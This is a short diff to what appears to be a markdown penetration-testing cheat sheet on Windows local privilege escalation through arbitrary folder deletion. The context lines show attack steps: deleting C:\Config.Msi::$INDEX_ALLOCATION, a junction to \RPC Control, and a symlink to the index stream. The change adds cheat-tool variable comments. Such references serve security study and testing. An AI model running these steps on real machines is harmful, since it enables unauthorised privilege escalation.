@@ -18,7 +18,9 @@ Some local privilege escalation chains turn an arbitrary folder delete, move, or
 ```cmd title:"DeleteFileW on Config.Msi index allocation stream"
 DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
 ```
-<!-- cheat -->
+<!-- cheat
+var INDEX_ALLOCATION
+-->
 
 ### junction to RPC Control
 
@@ -32,7 +34,9 @@ mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
 ```cmd title:"Symlink RPC Control entry to Config.Msi index stream"
 CreateSymlink "\\RPC Control\\file1.txt" "C:\\Config.Msi::$INDEX_ALLOCATION"
 ```
-<!-- cheat -->
+<!-- cheat
+var INDEX_ALLOCATION
+-->
 
 ### stage iconics_user temp
 
